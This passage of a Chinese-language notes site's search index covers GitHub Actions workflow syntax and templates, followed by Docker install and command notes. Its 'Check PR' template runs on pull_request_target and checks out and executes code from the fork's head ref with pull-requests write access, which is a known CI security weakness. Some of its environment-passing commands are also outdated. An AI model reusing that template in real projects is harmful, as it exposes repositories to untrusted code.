\u4e4b\u5916\u90fd\u4e3a 0</p> <p>\u5269\u4f59\u7684\u90e8\u5206\u5c31\u662f\u54cd\u5e94\u7684\u6570\u636e\uff0c\u5176\u7f16\u7801\u65b9\u5f0f\u4e0e\u8bf7\u6c42\u6570\u636e\u4e00\u81f4\uff0c\u5dee\u522b\u4ec5\u5728\u4e8e\u4f7f\u7528\u7684 Mask \u7684 nonce \u4e3a\u54cd\u5e94 iv\uff0c\u4ee5\u53ca\u52a0\u5bc6\u6240\u4f7f\u7528\u7684 key \u548c iv \u90fd\u662f\u54cd\u5e94\u90e8\u5206\u7684\uff08\u4e5f\u5c31\u662f\u5bf9\u8bf7\u6c42\u7684 key \u548c iv \u8fdb\u884c md5\uff09</p>"},{"location":"devops/system/","title":"\u7cfb\u7edf\u8fd0\u7ef4","text":"<p>Abstract</p> <p>\u5305\u62ec\u7cfb\u7edf\u670d\u52a1\u5668\u5efa\u8bbe\u4e0e\u914d\u7f6e\u3001\u5e38\u7528\u5de5\u5177\u8bb0\u5f55\uff0c\u4ee5\u53ca\u5176\u4ed6\u5404\u79cd\u6742\u4e03\u6742\u516b\u7684\u6280\u80fd</p>"},{"location":"devops/system/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u547d\u4ee4\u884c shell \u914d\u7f6e</li> <li>Git \u76f8\u5173\u4f7f\u7528\u4e0e\u914d\u7f6e</li> <li>Docker \u76f8\u5173\u914d\u7f6e\u4e0e\u6280\u672f</li> <li>gdb \u76f8\u5173\u4f7f\u7528\u5907\u5fd8</li> <li>GitHub Action \u57fa\u7840\u4e0e\u8fd0\u7528</li> <li>KVM \u865a\u62df\u673a\u57fa\u672c\u7528\u6cd5</li> <li>NAS \u914d\u7f6e\u8bb0\u5f55</li> </ul>"},{"location":"devops/system/action/","title":"GitHub Actions \u57fa\u7840\u4e0e\u8fd0\u7528","text":"<p> \u7ea6 1079 \u4e2a\u5b57  252 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>GitHub Actions workflow \u6587\u4ef6\u7684\u5e38\u7528\u5199\u6cd5\u8bb0\u5f55</p>"},{"location":"devops/system/action/#workflow","title":"workflow \u8bed\u6cd5","text":"<p>\u4e00\u822c\u7ed3\u6784\uff1a</p> <pre><code>name: &lt;workflow name&gt; # \u51fa\u73b0\u5728 Actions \u5217\u8868\u4e2d\non:             # \u89e6\u53d1\u6761\u4ef6\n  ...\npermissions:    # \u6743\u9650\u8bbe\u7f6e\n  ...\nconcurrency:    # \u5e76\u53d1\u63a7\u5236\n  ...\njobs:           # \u4efb\u52a1\u5217\u8868\n  &lt;job name&gt;:   # \u4efb\u52a1\u540d\n    runs-on: &lt;os&gt; # \u8fd0\u884c\u73af\u5883\n    steps:      # steps \u4f1a\u4f9d\u6b21\u6267\u884c\n      - name: &lt;step name&gt; # \u6b65\u9aa4\u540d\uff0c\u53ef\u7701\u7565\n        uses: &lt;action&gt; # \u4f7f\u7528\u7684 action\n        with:          # \u4f20\u9012\u7ed9 action \u7684\u53c2\u6570\n          ...\n      - name: &lt;step name&gt;\n        run: &lt;command&gt; # \u76f4\u63a5\u8fd0\u884c\u547d\u4ee4\n        env:           # \u4f20\u9012\u73af\u5883\u53d8\u91cf\n          &lt;key&gt;: &lt;value&gt;\n</code></pre>"},{"location":"devops/system/action/#trigger","title":"trigger","text":"<p>\u4f55\u65f6\u89e6\u53d1 action \u8fd0\u884c\uff0c\u5e38\u7528\uff1a</p> <pre><code>on:\n  push:\n    branches: [master, dev] # \u63a8\u9001\u5230 master \u6216 dev \u5206\u652f\u65f6\u89e6\u53d1\n  pull_request:\n    types: [opened, reopened, synchronize] # PR \u521b\u5efa\u3001\u91cd\u65b0\u6253\u5f00\u6216\u66f4\u65b0\u65f6\u89e6\u53d1\n  schedule:\n    - cron: \"0 0/24 * * *\" # \u5b9a\u65f6\u4efb\u52a1\uff0c\u6bcf 24 \u5c0f\u65f6\u8fd0\u884c\u4e00\u6b21\n  workflow_dispatch: # \u624b\u52a8\u89e6\u53d1\uff08\u5728 Action \u9875\u9762\u53ef\u4ee5\u70b9\u51fb\u8fd0\u884c\uff09\n</code></pre> <p>\u6ce8\u610f pull_request \u4e8b\u4ef6\u662f\u5728 PR \u7684\u6e90\u4ed3\u5e93\u4e0a\u8fd0\u884c\uff0cpull_request_target \u662f\u5728\u76ee\u6807\u4ed3\u5e93\u4e0a\u8fd0\u884c\uff0c\u4e8c\u8005\u652f\u6301\u7684\u6743\u9650\u4e0d\u4e00\u6837\u3002</p>"},{"location":"devops/system/action/#jobs","title":"jobs","text":"<p>\u8fd9\u90e8\u5206\u662f workflow \u6838\u5fc3\uff0c\u4f9d\u6b21\u5199\u6b65\u9aa4\u5373\u53ef\uff0c\u53ef\u4ee5\u7528 uses \u4f7f\u7528\u73b0\u6210\u7684 action\uff0c\u4e5f\u53ef\u4ee5\u7528 run \u76f4\u63a5\u8fd0\u884c\u547d\u4ee4\u3002\u8fd9\u91cc\u53ea\u8bb0\u5f55\u4e00\u4e9b\u5176\u4ed6\u7528\u6cd5\u3002</p>"},{"location":"devops/system/action/#_1","title":"\u4e0d\u540c\u8fd0\u884c\u73af\u5883\u548c\u7248\u672c\u642d\u914d","text":"<pre><code>jobs:\n  job:\n    strategy:\n      matrix: # \u4f1a\u521b\u5efa\u516d\u4e2a job \u5e76\u884c\u8fd0\u884c\n        os: [ubuntu-latest, macos-latest]\n        version: [10, 12, 14]\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.version }}\n</code></pre>"},{"location":"devops/system/action/#_2","title":"\u6761\u4ef6\u6267\u884c","text":"<pre><code>jobs:\n  job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ...\n        if: ${{ !contains(github.event.head_commit.message, '[skip ci]') }} # \u5982\u679c\u63d0\u4ea4\u4fe1\u606f\u4e0d\u5305\u542b [skip ci] \u5219\u8fd0\u884c\n        # job \u4e5f\u53ef\u4ee5\u6709 if \u8bed\u53e5\n</code></pre> <p>\u66f4\u591a\u53ef\u7528\u4e0a\u4e0b\u6587\u73af\u5883\u89c1 GitHub Actions docs &gt; Reference &gt; Contexts\u3002</p>"},{"location":"devops/system/action/#job","title":"\u591a job \u4f9d\u8d56","text":"<p>\u7c7b\u4f3c docker-compose depends_on\uff1a</p> <pre><code>jobs:\n  job1:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Job 1\"\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1 # \u7b49\u5f85 job1 \u5b8c\u6210\u540e\u518d\u8fd0\u884c\uff0c\u4e0d\u52a0\u7684\u8bdd\u4f1a\u5e76\u884c\u8fd0\u884c\n    steps:\n      - run: echo \"Job 2\"\n</code></pre>"},{"location":"devops/system/action/#steps","title":"steps \u95f4\u4f20\u9012\u6570\u636e","text":"<p>\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u4f20\u9012\uff1a</p> <pre><code>steps:\n  - run: |\n    export FOO=bar\n    echo \"::set-env name=FOO::$FOO\" # \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\n  - run: echo $FOO # \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u73af\u5883\u53d8\u91cf\n# or\nsteps:\n  - run: |\n    echo \"FOO=bar\" &gt;&gt; $GITHUB_ENV # \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\n  - run: echo ${{ env.FOO }}\n</code></pre> <p>\u901a\u8fc7 outputs \u4f20\u9012\uff1a</p> <pre><code>steps:\n  - id: step1\n    run: echo \"::set-output name=foo::bar\"\n  - run: echo \"${{ steps.step1.outputs.foo }}\"\n# or\nsteps:\n  - id: step1\n    run: echo \"foo=bar\" &gt;&gt; $GITHUB_OUTPUT # \u8bbe\u7f6e\u8f93\u51fa\u53d8\u91cf\n  - run: echo \"${{ steps.step1.outputs.foo }}\"\n</code></pre> <pre><code>import os\nwith open(os.environ['GITHUB_OUTPUT'], 'a') as f:\n    f.write('foo=bar\\n')\n</code></pre> <p>\u5305\u542b\u7279\u6b8a\u5b57\u7b26\u53ef\u4ee5\u4f7f\u7528 base64 \u5148\u7f16\u7801\uff0c\u8fc7\u957f\u7684\u8bdd\u5efa\u8bae\u7528\u6587\u4ef6\u5b58\u50a8\uff0cjobs \u95f4\u901a\u8fc7 artifacts \u4f20\u9012\u3002</p>"},{"location":"devops/system/action/#jobs_1","title":"jobs \u95f4\u4f20\u9012\u6570\u636e","text":"<p>\u901a\u8fc7 outputs \u4f20\u9012\uff1a</p> <pre><code>jobs:\n  job1:\n    runs-on: ubuntu-latest\n    outputs:\n      output1: ${{ steps.step1.outputs.foo }}\n    steps:\n      - id: step1\n        run: echo \"foo=bar\" &gt;&gt; $GITHUB_OUTPUT\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1\n    steps:\n      - run: echo \"${{ needs.job1.outputs.output1 }}\"\n</code></pre> <p>\u901a\u8fc7 artifacts \u4f20\u9012\uff1a</p> <pre><code>jobs:\n  job1:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/upload-artifact@v4\n        with:\n          name: my-artifact\n          path: ./site\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: my-artifact\n</code></pre>"},{"location":"devops/system/action/#step","title":"\u5931\u8d25 step \u5904\u7406","text":"<p>\u9488\u5bf9\u67d0\u4e9b\u4f1a\u5931\u8d25\u7684 step\uff08\u4f8b\u5982 run \u547d\u4ee4\u8fd4\u56de\u503c\u975e 0\uff09\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4f1a\u5bfc\u81f4\u540e\u7eed steps \u4e0d\u518d\u6267\u884c\u5e76\u5bfc\u81f4\u6574\u4e2a job \u5931\u8d25\u3002\u4e3a\u4e86\u8ba9\u540e\u7eed steps \u7ee7\u7eed\u6267\u884c\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <ol> <li> <p>\u4f7f\u7528 continue-on-error\uff1a</p> <pre><code>- name: Run command\n  run: ...\n  continue-on-error: true\n</code></pre> <ul> <li>\u4f46\u8fd9\u79cd\u60c5\u51b5\u4f1a\u5f3a\u5236 step \u7684\u7ed3\u679c\u53d8\u4e3a success\uff0c\u5982\u679c\u9700\u8981\u4fdd\u7559\u9519\u8bef\u72b6\u6001\u5219\u4e0d\u80fd\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5</li> </ul> </li> <li> <p>\u5bf9\u540e\u7eed steps \u589e\u52a0\u6761\u4ef6\u5224\u65ad\uff1a</p> <pre><code>- name: Run after failed step\n  if: ${{ failure() }}\n  run: ...\n</code></pre> <ul> <li>\u5728\u524d\u9762\u7684 step \u6709\u5931\u8d25\u7684\u60c5\u51b5\u4e0b\u4f1a\u6267\u884c\uff0csuccess() \u4e3a\u5728\u5168\u90e8\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u6267\u884c</li> <li>\u901a\u8fc7 <code>${{ !cancelled() }}</code> \u6216 <code>${{ failure() || success() }}</code> \u6765\u4f7f step \u8fd0\u884c\u4e0d\u88ab\u524d\u9762\u7684 step \u5931\u8d25\u72b6\u6001\u5f71\u54cd</li> <li>\u5982\u679c\u6709\u989d\u5916\u5224\u65ad\u6761\u4ef6\u53ef\u4ee5\u7528 <code>${{ !cancelled() &amp;&amp; &lt;original conditions &gt;}}</code></li> <li>\u907f\u514d\u4f7f\u7528 <code>${{ always() }}</code> \u56e0\u4e3a\u4f1a\u5bfc\u81f4\u5373\u4f7f\u53d6\u6d88\u4e86\u8fd0\u884c\u4e5f\u4ecd\u7136\u4f1a\u7ee7\u7eed</li> </ul> </li> </ol>"},{"location":"devops/system/action/#secrets","title":"\u4f20\u9012 secrets","text":"<p>\u654f\u611f\u4fe1\u606f\u9700\u8981\u5728 repo \u7684\u8bbe\u7f6e\u4e2d\u6dfb\u52a0 secrets\uff0c\u7136\u540e\u901a\u8fc7 <code>${{ secrets.SECRET_NAME }}</code> \u4f7f\u7528\u3002</p> <p>\u5728 Action \u7684\u8f93\u51fa\u4e2d\u5305\u542b\u4e0e secret \u5185\u5bb9\u76f8\u540c\u7684\u5b57\u7b26\u4e32\u4f1a\u5c06\u5176\u66ff\u6362\u4e3a ****** \u5904\u7406\u3002</p>"},{"location":"devops/system/action/#_3","title":"\u6743\u9650\u63a7\u5236","text":"<p>\u6709\u65f6\u8fd0\u884c\u9700\u8981\u8d4b\u4e88 action \u989d\u5916\u7684\u6743\u9650\uff0c\u6bd4\u5982\u53d1\u5e03\u8bc4\u8bba\u9700\u8981\u4fee\u6539 PR\uff0c\u9700\u8981 <code>pull-requests: write</code> \u6743\u9650\u3002\u4e00\u79cd\u65b9\u6cd5\u662f\u4e3a\u7279\u5b9a\u6b65\u9aa4\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf <code>GITHUB_TOKEN</code>\uff0c\u5c06\u5176\u503c\u8bbe\u7f6e\u4e3a\u751f\u6210\u7684\u4e2a\u4eba token\uff08ghp_ \u5f00\u5934\uff09\uff0c\u4f46\u8fd9\u79cd\u60c5\u51b5\u8bc4\u8bba\u4f1a\u4ee5 token \u7684\u4e2a\u4eba\u540d\u4e49\u53d1\u5e03\u800c\u975e action\u3002</p> <p>\u53e6\u4e00\u79cd\u66f4\u65b9\u4fbf\u7684\u65b9\u6cd5\u662f\u76f4\u63a5\u4e3a workflow \u6216\u5355\u4e2a job \u8bbe\u7f6e\u6743\u9650\uff1a</p> <pre><code>permissions:\n  contents: read          # \u8bfb\u53d6\u4ee3\u7801\u5e93\u5185\u5bb9\n  pages: write      # \u5141\u8bb8\u53d1\u5e03 GitHub Pages\n  id-token: write   # \u5141\u8bb8\u7b7e\u53d1 OIDC token\uff08pages \u9700\u8981\uff09\n  pull-requests: write  # \u5141\u8bb8\u4fee\u6539 PR\uff08\u53d1\u5e03\u8bc4\u8bba\u9700\u8981\uff09\n</code></pre> <p>\u66f4\u591a\u6743\u9650\u89c1 GitHub Actions docs &gt; Reference &gt; Workflow syntax\u3002</p>"},{"location":"devops/system/action/#_4","title":"\u5e76\u53d1\u63a7\u5236","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u5e76\u53d1\u63a7\u5236\u6765\u9650\u5236\u540c\u4e00\u65f6\u95f4\u53ea\u80fd\u8fd0\u884c\u4e00\u4e2a workflow\uff0c\u6216\u53d6\u6d88\u6b63\u5728\u8fd0\u884c\u7684\u65e7 workflow\uff1a</p> <pre><code>concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }} # \u4ee5 workflow \u540d\u79f0\u548c\u5206\u652f\u540d\u4f5c\u4e3a\u7ec4\u540d\n  cancel-in-progress: true # \u53ea\u8fd0\u884c\u6700\u65b0\u4e00\u6b21\u7684\u90e8\u7f72\uff0c\u53d6\u6d88\u65e7\u7684\u6ca1\u8fd0\u884c\u5b8c\u7684\u4efb\u52a1\n</code></pre> <p>\u540c\u4e00\u4e2a group \u5185\u7684 workflow \u4f1a\u4e92\u65a5\u8fd0\u884c\uff0c\u53ea\u6709\u6700\u65b0\u4e00\u6b21\u4f1a\u88ab\u6267\u884c\uff0c\u5176\u4ed6\u7684\u4f1a\u88ab\u53d6\u6d88\u3002</p>"},{"location":"devops/system/action/#workflow_1","title":"\u5e38\u7528 workflow \u6a21\u677f","text":""},{"location":"devops/system/action/#github-pages","title":"\u6784\u5efa\u5e76\u90e8\u7f72\u81f3 GitHub Pages","text":"<pre><code>name: Build and Deploy to GitHub Pages\n\non:\n  push:\n    branches:\n      - master \n  workflow_dispatch:\n\npermissions:\n  contents: read\n  pages: write      # \u53d1\u5e03 pages \u9700\u8981 pages: write\n  id-token: write   # \u53d1\u5e03 pages \u9700\u8981 id-token: write\n\nconcurrency:\n  group: 'deploy'\n  cancel-in-progress: true # \u53ea\u8fd0\u884c\u6700\u65b0\u4e00\u6b21\u7684\u90e8\u7f72\uff0c\u53d6\u6d88\u65e7\u7684\u6ca1\u8fd0\u884c\u5b8c\u7684\u4efb\u52a1\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n      - name: Setup GitHub Pages\n        uses: actions/configure-pages@v5\n      - name: Build site    # \u5176\u4ed6\u6784\u5efa\u547d\u4ee4\n        run: ...\n      - name: Upload artifact\n        uses: actions/upload-pages-artifact@v3\n        with:\n          path: ./site      # build \u4ea7\u7269\u76ee\u5f55\n\n  deploy:\n    environment:\n      name: github-pages\n      url: ${{ steps.deployment.outputs.page_url }}\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Deploy to GitHub Pages\n        id: deployment\n        uses: actions/deploy-pages@v4\n</code></pre>"},{"location":"devops/system/action/#pr","title":"\u5ba1\u8ba1 PR \u5e76\u53d1\u5e03\u8bc4\u8bba","text":"<pre><code>name: Check PR\n\non:\n  pull_request_target:  # \u4e3a\u4e86\u80fd\u5728 PR \u6765\u81ea fork \u4ed3\u5e93\u65f6\u4e5f\u80fd\u53d1\u5e03\u8bc4\u8bba\uff0c\u9700\u8981 _target\n    types: [opened, reopened, synchronize] # \u521b\u5efa\u3001\u91cd\u65b0\u6253\u5f00\u3001\u66f4\u65b0\u65f6\u89e6\u53d1\n\npermissions:\n  contents: read\n  pull-requests: write  # \u53d1\u5e03 PR \u8bc4\u8bba\u9700\u8981 pull-requests: write\n\nconcurrency: ci-${{ github.workflow }}-${{ github.ref }}\n\njobs:\n  check-pr:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:   # \u9700\u8981 checkout \u5230 PR \u6240\u5728\u7684 repo \u548c ref\n          repository: ${{ github.event.pull_request.head.repo.full_name }}\n          ref: ${{ github.event.pull_request.head.ref }}\n      - name: Get changed files\n        id: changed-files\n        uses: tj-actions/changed-files@v46\n      - name: Run checker\n        if: steps.changed-files.outputs.any_changed == 'true' # \u53ea\u5728\u6709\u6539\u52a8\u65f6\u8fd0\u884c\n        env:\n          GITHUB_URL: ${{ github.event.pull_request.head.repo.clone_url }}\n          GITHUB_REF: ${{ github.event.pull_request.head.ref }}\n        run: ... # \u8fd0\u884c\u68c0\u67e5\u811a\u672c\uff0c\u4fbf\u6377\u671f\u95f4\u53ef\u4ee5\u8f93\u51fa\u5230\u6587\u4ef6 results.txt \u65b9\u4fbf\u8bc4\u8bba\n      - name: Comment PR\n        if: steps.changed-files.outputs.any_changed == 'true'\n        uses: thollander/actions-comment-pull-request@v3\n        with:\n          file-path: results.txt        # \u4ece\u6587\u4ef6\u8bfb\u53d6\u8bc4\u8bba\u5185\u5bb9\n          comment-tag: checker-results  # \u7528\u4e8e\u6807\u8bb0\u8bc4\u8bba\uff0c\u6bcf\u6b21\u8fd0\u884c\u8fdb\u884c\u66f4\u65b0\u800c\u975e\u65b0\u53d1\u5e03\n</code></pre>"},{"location":"devops/system/action/#actions","title":"\u5176\u4ed6\u5e38\u7528 actions","text":"<p> appleboy/scp-action\uff0c\u7528\u4e8e\u901a\u8fc7 scp \u4e0a\u4f20\u6587\u4ef6\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\uff1a</p> <pre><code>      - uses: appleboy/scp-action@v1\n        with:\n          host: ${{ secrets.HOST }}         # \u901a\u8fc7 repo secrets \u8bbe\u7f6e\u76ee\u6807\n          username: ${{ secrets.USERNAME }}\n          password: ${{ secrets.PASSWORD }} # \u6216\u901a\u8fc7 key: \u6307\u5b9a\u79c1\u94a5\n          port: ${{ secrets.PORT }}\n          source: \"site/*\"\n          target: ${{ secrets.SCP_TARGET }}\n          strip_components: 1\n</code></pre> <p> tj-actions/changed-files\uff0c\u83b7\u53d6 push \u6216 PR \u6240\u66f4\u6539\u7684\u6587\u4ef6\u5217\u8868\uff1a</p> <pre><code>      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0  # fetch \u5b8c\u6574\u5386\u53f2\u8bb0\u5f55\uff0c\u6216\u81f3\u5c11\u4e3a 2\n      - name: Get changed files\n        id: changed-files\n        uses: tj-actions/changed-files@v46\n        with:\n          files: | # \u53ef\u6309 .gitignore \u8bed\u6cd5\u6307\u5b9a\u9700\u8981\u68c0\u67e5\u7684\u6587\u4ef6\n            ...\n      - name: Do something if changed\n        if: steps.changed-files.outputs.any_changed == 'true'\n        env:    # \u9ed8\u8ba4\u7a7a\u683c\u5206\u5272\uff08\u53ef\u901a\u8fc7 separator \u6307\u5b9a\uff09\n          CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}\n        run: ...\n</code></pre>"},{"location":"devops/system/action/#reviewdog","title":"ReviewDog","text":"<p> reviewdog/reviewdog \u53ef\u4ee5\u5c06 linter \u7684\u7ed3\u679c\u81ea\u52a8\u4e0a\u4f20\u81f3 GitHub PR \u4e2d\uff0c\u8fdb\u884c\u81ea\u52a8 review\u3002</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u4f7f\u7528 github-pr-review \u8fd9\u4e2a reporter \u6548\u679c\u6700\u597d\uff0c\u548c\u6b63\u5e38 review \u4e00\u6837\u800c\u4e14\u4f1a\u5e26\u4fee\u6539\u5efa\u8bae\uff0c\u4f46\u8981\u6c42\u662f\u4ece\u4e3b repo \u8fd0\u884c\u4e0d\u80fd\u6765\u81ea fork \u7684 repo\uff0c\u89e3\u51b3\u65b9\u6cd5\u4e00\u662f\u4f7f\u7528 pull_request_target trigger\uff08\u548c comment-pr \u4e00\u6837\uff09\uff0c\u6216\u8005\u4e0d\u505a\u4fee\u6539\u7684\u8bdd reviewdog \u4f1a\u81ea\u52a8\u8f6c\u7528 logging commands \u6765\u8fdb\u884c\u4e0a\u62a5\uff0c\u4f46\u6548\u679c\u4e0d\u4f73\u3002</p> <p>\u5728 Action \u4e2d\u4f7f\u7528\u53ef\u4ee5\u5148\u914d\u7f6e\u73af\u5883\uff1a</p> <pre><code>- name: Setup reviewdog\n  uses: reviewdog/action-setup@v1.3.2\n  with:\n    reviewdog_version: latest\n</code></pre> <p>\u7136\u540e\u5728\u540e\u7eed\u7684 run \u547d\u4ee4\u4e2d\u5c31\u53ef\u4ee5\u4f7f\u7528 reviewdog \u547d\u4ee4\u4e86\u3002\u9664\u53bb\u4e00\u4e9b\u652f\u6301 reviewdog rdjson \u683c\u5f0f\u8f93\u51fa\u7684 linter\uff08\u4f8b\u5982 autocorrect\uff09\u4ee5\u5916\uff0c\u4f8b\u5982\u81ea\u5df1\u7f16\u5199 linter \u7684\u8bdd\u6700\u65b9\u4fbf\u7684\u7528\u6cd5\u662f\u91c7\u7528 errorfmt \u7684\u683c\u5f0f\uff0c\u76f4\u63a5\u4ece linter \u8f93\u51fa\u6765\u8bfb\u53d6\u9519\u8bef\u4fe1\u606f\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;command&gt; | reviewdog \\\n  -efm=\"%f:%l:%t:%m\" \\\n  -name=\"&lt;name&gt;\" \\\n  -reporter=github-pr-review \\\n  -level=warning \\\n  -fail-level=error\n</code></pre> <p>\u53ea\u8981\u524d\u9762\u7684\u547d\u4ee4\u8f93\u51fa\u7684\u683c\u5f0f\u80fd\u5339\u914d\u5c31\u53ef\u4ee5\uff0cefm \u8868\u793a\u4e86\u5339\u914d\u7684\u683c\u5f0f\uff0c\u5176\u4e2d %f \u4e3a\u6587\u4ef6\u540d\uff08\u4ece repo \u6839\u76ee\u5f55\u5f00\u59cb\u8ba1\u7b97\uff09\uff0c%l \u4e3a\u884c\u53f7\uff0c%t \u4e3a\u9519\u8bef\u7c7b\u578b\uff08e/w/i/n \u5355\u4e2a\u5b57\u6bcd\uff09\uff0c%m \u4e3a\u9519\u8bef\u6d88\u606f\u3002name \u9009\u9879\u4f1a\u6307\u5b9a\u68c0\u67e5\u7684\u540d\u5b57\uff0c\u540c\u4e00 name \u7684\u6240\u6709\u95ee\u9898\u4f1a\u6c47\u603b\u5230\u4e00\u6b21 review \u91cc\u3002level \u4e3a\u4e0a\u62a5\u81f3 review \u7684\u7b49\u7ea7\uff0cfail-level \u4e3a\u5982\u679c\u8fbe\u5230\u4e86\u8be5\u7b49\u7ea7\u5219\u4f1a\u5bfc\u81f4\u547d\u4ee4\u8fd4\u56de\u975e\u96f6\uff08\u7528\u4e8e\u8ba9 action step \u5931\u8d25\uff09\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6c38\u8fdc\u8fd4\u56de 0\u3002</p> <p>\u5728 action \u4e2d\u4f7f\u7528\u53ea\u9700\u8981\u7ed9\u5b9a\u73af\u5883\u53d8\u91cf REVIEWDOG_GITHUB_API_TOKEN\uff0c\u7136\u540e\u8bbe\u5b9a\u6743\u9650\u5373\u53ef\uff1a</p> <pre><code>permissions:\n  checks: write\n  contents: read\n  pull-requests: write\n\njobs:\n  auto-review:\n    steps:\n      - name: Setup reviewdog\n        uses: reviewdog/action-setup@v1.3.2\n        with:\n          reviewdog_version: latest\n      - name: Run reviewdog\n        env:\n          REVIEWDOG_GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          &lt;command&gt; | reviewdog \\\n            -efm=\"%f:%l:%t:%m\" \\\n            -name=\"&lt;name&gt;\" \\\n            -reporter=github-pr-review \\\n            -level=warning \\\n            -fail-level=error\n</code></pre>"},{"location":"devops/system/docker/","title":"Docker \u76f8\u5173\u914d\u7f6e\u4e0e\u6280\u672f","text":"<p> \u7ea6 1612 \u4e2a\u5b57  90 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u4e00\u4e9b\u5e38\u7528/\u5e38\u5fd8\u7684 docker \u547d\u4ee4\u3001Dockerfile \u7b49</p>"},{"location":"devops/system/docker/#_1","title":"\u5b89\u88c5","text":"<ul> <li><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></li> <li><code>sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose</code></li> <li><code>sudo chmod +x /usr/local/bin/docker-compose</code></li> </ul> <p>macOS \u63a8\u8350\u76f4\u63a5 <code>brew install orbstack</code> \u5b89\u88c5 OrbStack\uff0c\u5185\u7f6e\u4e86 docker \u4e14\u66f4\u4f18\u5316\u66f4\u4fbf\u6377\u3002</p> <p>docker pull \u7b49\u9700\u8981\u4f7f\u7528\u4ee3\u7406\u7684\u8bdd\u9700\u8981\u4fee\u6539\u914d\u7f6e\uff08\u4e0d\u4f1a\u4f7f\u7528\u7cfb\u7edf\u4ee3\u7406\u548c\u7ec8\u7aef\u73af\u5883\u53d8\u91cf\u4ee3\u7406\uff09\uff0c\u4fee\u6539\u5728 <code>~/.docker/config.json</code>\uff08OrbStack \u5728 <code>~/.orbstack/config/docker.json</code> \u6216\u901a\u8fc7\u8bbe\u7f6e\u754c\u9762\u4fee\u6539\uff09\uff1a</p> <pre><code>{\n  \"proxies\": {\n    \"http-proxy\": \"http:\\/\\/127.0.0.1:7890\",\n    \"https-proxy\": \"http:\\/\\/127.0.0.1:7890\"\n  }\n}\n</code></pre>"},{"location":"devops/system/docker/#docker_1","title":"docker \u547d\u4ee4","text":""},{"location":"devops/system/docker/#_2","title":"\u955c\u50cf\u76f8\u5173","text":"<ul> <li><code>docker images</code> \u5217\u51fa\u672c\u5730\u955c\u50cf</li> <li><code>docker search &lt;image&gt;</code> \u641c\u7d22\u955c\u50cf</li> <li><code>docker pull &lt;image&gt;</code> \u62c9\u53d6\u955c\u50cf</li> <li><code>docker rmi &lt;image&gt;</code> \u5220\u9664\u955c\u50cf</li> <li><code>docker build -t &lt;image&gt; .</code> \u4ece Dockerfile \u6784\u5efa\u955c\u50cf\uff0c\u5e76\u6253\u4e0a tag <code>&lt;image&gt;</code></li> <li><code>docker export &lt;image&gt; &gt; &lt;file&gt;.tar</code> \u4fdd\u5b58\u955c\u50cf\u4e3a tar \u5305</li> <li><code>docker import &lt;file&gt;.tar &lt;image&gt;</code> \u4ece tar \u5305\u5bfc\u5165\u955c\u50cf</li> <li><code>docker tag &lt;image&gt; &lt;image&gt;:&lt;tag&gt;</code> \u7ed9\u955c\u50cf\u6253 tag\uff08\u91cd\u547d\u540d\uff09</li> </ul>"},{"location":"devops/system/docker/#_3","title":"\u5bb9\u5668\u76f8\u5173","text":"<ul> <li><code>docker ps -a</code> \u5217\u51fa\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668</li> <li><code>docker run -it &lt;image&gt;</code> \u8fd0\u884c\u955c\u50cf<ul> <li><code>-d</code> \u540e\u53f0\u8fd0\u884c</li> <li><code>-p &lt;host&gt;:&lt;container&gt;</code> \u7aef\u53e3\u6620\u5c04</li> <li><code>-v &lt;host&gt;:&lt;container&gt;</code> \u76ee\u5f55\u6620\u5c04</li> <li><code>-e &lt;key&gt;=&lt;value&gt;</code> \u73af\u5883\u53d8\u91cf</li> <li><code>--name &lt;name&gt;</code> \u5bb9\u5668\u540d</li> <li><code>--rm</code> \u8fd0\u884c\u5b8c\u540e\u81ea\u52a8\u5220\u9664\u5bb9\u5668</li> <li><code>--network &lt;network&gt;</code> \u6307\u5b9a\u7f51\u7edc</li> </ul> </li> <li><code>docker start &lt;container&gt;</code> \u542f\u52a8\u5bb9\u5668</li> <li><code>docker restart &lt;container&gt;</code> \u91cd\u542f\u5bb9\u5668</li> <li><code>docker stop &lt;container&gt;</code> \u505c\u6b62\u5bb9\u5668</li> <li><code>docker rm &lt;container&gt;</code> \u5220\u9664\u5bb9\u5668</li> <li><code>docker exec -it &lt;container&gt; /bin/bash</code> \u8fdb\u5165\u5bb9\u5668</li> <li><code>docker cp ... ...</code> 